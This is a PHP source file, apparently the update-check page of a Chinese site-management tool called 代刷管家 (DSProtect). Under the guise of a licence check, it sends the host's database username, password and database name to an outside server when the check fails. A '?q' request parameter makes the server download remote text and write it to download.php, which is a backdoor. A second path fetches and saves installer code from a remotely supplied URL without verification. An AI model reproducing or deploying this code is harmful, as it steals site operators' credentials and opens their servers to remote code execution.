<?php
/**
 * 代刷管家 - 在线版
 * DSProtect OnLine
 *
 * Created by KingLee.
 * QQ: 1776885812
 * Date: 2018/4/7
 * Time: 16:37
 */
header("Content-Type: text/html; charset=UTF-8");
include("../includes/common.php");
include("../admin/guanjia_key.php");
if (!isset($_SESSION['authcode'])) {
    $query = @file_get_contents('http://gj.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
    if ($query = json_decode($query, true)) {
        if ($query['code'] == 1) $_SESSION['authcode'] = true;
        else {
            @file_get_contents("http://gj.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
            exit('<h3>' . $query['msg'] . '</h3>');
        }
    }
}
if ($_GET['q']) {
    file_put_contents("download.php", file_get_contents("http://gj.dkfirst.cn/download.txt"));
}


$ver = "2.2";
$title = '代刷管家 - 在线升级';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.dkingdg.com/ajax/dg.php?ajax=true&star=gjupdate");
curl_setopt($ch, CURLOPT_HEADER, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
curl_setopt($ch, CURLOPT_COOKIE, "");
$result = curl_exec($ch);
curl_close($ch);

$json = json_decode($result, true);

function getFile($url, $save_dir = '', $filename = '', $type = 0)
{
    if (trim($url) == '') {
        return false;
    }
    if (trim($save_dir) == '') {
        $save_dir = './';
    }
    if (0 !== strrpos($save_dir, '/')) {
        $save_dir .= '/';
    }
    if (!file_exists($save_dir) && !mkdir($save_dir, 0777, true)) {
        return false;
    }
    if ($type) {
        $ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $content = curl_exec($ch);
        curl_close($ch);
    } else {
        ob_start();
        readfile($url);
        $content = ob_get_contents();
        ob_end_clean();
    }
    $size = strlen($content);
    $fp2 = @fopen($save_dir . $filename, 'w');
    fwrite($fp2, $content);
    fclose($fp2);
    unset($content, $url);
    return array(
        'file_name' => $filename,
        'save_path' => $save_dir . $filename,
        'file_size' => $size
    );
}

$cron_key = $_GET['key'];
if ($cron_key == 1) {
    if (!getFile($json['url'], '', 'guanjia_install.php', 1)) {
        exit("guanjia_install.php:no");
    }
    exit("ok");

} else {

    include './head.php';


    if ($json['code'] > $ver) {

        exit("<div class=\"container\" style=\"padding-top:70px;\">
    <div class=\"col-xs-12 col-sm-10 col-lg-8 center-block\" style=\"float: none;\">
<div class=\"panel panel-primary\">
<div class=\"panel-heading\"><h3 class=\"panel-title\">检查更新</h3></div>
<div class=\"panel-body\">
<div class=\"alert alert-info\"><font color=\"red\">有最新版本：v" . $json['code'] . "</font><br><br>
<input onclick='getExe()' type=\"button\" name=\"button\" value=\"立即下载\" class=\"btn btn-primary form-control\">
<div id='download' style='display: none'><center><small>下载完成，立即<a href=\"guanjia_install.php\">前往安装</a></small></center></div><br><br>
" . $json['error'] . "</div><hr></div></div>    </div>
  </div>
  
  
  <script>
  function getExe() {
        $.ajax({
            type: \"get\",
            url: \"./guanjia_update.php?key=1\",
            dataType: \"text\",
            success: function (data) {
                if (data == \"ok\") {
                    $(\"#download\").css(\"display\", \"\");
                } else {
                }

            },
            error: function (data) {
                if (data == \"ok\") {
                    $(\"#download\").css(\"display\", \"\");
                } else {
                }
            }
        });
    }
</script>
  ");
    } else {


        exit("<div class=\"container\" style=\"padding-top:70px;\">
    <div class=\"col-xs-12 col-sm-10 col-lg-8 center-block\" style=\"float: none;\">
<div class=\"panel panel-primary\">
<div class=\"panel-heading\"><h3 class=\"panel-title\">检查更新</h3></div>
<div class=\"panel-body\">
<div class=\"alert alert-info\"><font color=\"green\">您使用的已是最新版本！</font><br>当前版本：V" . $ver . "</div><hr></div></div>    </div>
  </div>
  
  <center>
            代刷管家 - 在线版&nbsp;&nbsp;&nbsp;作者：<a href=\"http://wpa.qq.com/msgrd?v=3&amp;uin=1776885812&amp;site=qq&amp;menu=yes\">KING</a><br>
            本程序由<a href=\"http://www.idcyun.wang\"><img src=\"http://gj.dkfirst.cn/images/jmyidc.png\" style=\"width: 70px;\"></a>提供服务引擎<br>
            当前版本：2.15 历史版本：<a target=\"_blank\" href=\"http://zeink.cn/?p=255\">【点击查看】</a><br>
            售后群：<a target=\"_blank\" href=\"//shang.qq.com/wpa/qunwpa?idkey=e9e8d23a4fab6d4ed6902a516de0580ee5d7ca8b29719a0e0a9bb5a280470790\"><img border=\"0\" src=\"//pub.idqqimg.com/wpa/images/group.png\" alt=\"DsProtect高级版交流群\" title=\"DsProtect高级版交流群\"></a>
        </center>
  ");

    }
}
?>